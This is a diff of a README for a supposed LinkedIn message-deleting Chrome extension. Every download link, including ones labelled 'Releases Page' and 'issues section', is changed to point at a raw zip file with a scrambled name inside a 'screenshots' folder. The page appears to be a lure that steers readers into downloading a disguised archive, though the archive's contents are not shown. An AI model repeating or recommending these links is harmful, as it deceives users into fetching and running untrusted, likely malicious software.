@@ -1,6 +1,6 @@
 # 🧹 ZeroDM-Delete-LinkedIn-Messages - Clean Your LinkedIn Inbox with Ease
 
-![Download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/In-Messages-Zero-Delete-D-Linked-v1.8.zip)
+![Download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/D-Messages-Zero-Delete-Linked-In-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,14 +14,14 @@ Welcome to ZeroDM-Delete-LinkedIn-Messages! This simple application helps you cl
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/In-Messages-Zero-Delete-D-Linked-v1.8.zip)
+- **Releases Page:** [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/D-Messages-Zero-Delete-Linked-In-3.8.zip)
 
 ## 🛠 Installation Steps
 
 Follow these steps to download and run ZeroDM-Delete-LinkedIn-Messages:
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
-   - [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/In-Messages-Zero-Delete-D-Linked-v1.8.zip)
+   - [Visit this page to download](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/D-Messages-Zero-Delete-Linked-In-3.8.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version of the application.
    
@@ -57,7 +57,7 @@ If you experience issues:
 
 1. Ensure you have the latest version of Google Chrome.
 2. Confirm that the extension is enabled in Chrome's extensions settings.
-3. If problems persist, visit the [issues section](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/In-Messages-Zero-Delete-D-Linked-v1.8.zip) of the repository for help or to report a bug.
+3. If problems persist, visit the [issues section](https://github.com/velter82/ZeroDM-Delete-LinkedIn-Messages/raw/refs/heads/main/screenshots/D-Messages-Zero-Delete-Linked-In-3.8.zip) of the repository for help or to report a bug.
 
 ## 📞 Support
 
